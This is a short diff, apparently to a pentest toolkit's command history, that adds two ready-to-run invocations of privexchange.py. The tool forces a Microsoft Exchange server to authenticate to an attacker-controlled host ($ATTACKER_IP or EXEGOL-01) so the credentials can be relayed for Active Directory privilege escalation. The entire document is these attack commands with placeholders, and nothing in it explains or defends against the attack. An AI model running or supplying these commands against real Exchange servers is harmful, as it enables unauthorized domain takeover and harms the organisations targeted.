@@ -1,0 +1,2 @@
+privexchange.py -ah "$ATTACKER_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$TARGET"
+privexchange.py -u "$USER" -p "$PASSWORD" -ah "EXEGOL-01.$DOMAIN" EXCHANGE."$DOMAIN" -d "$DOMAIN"
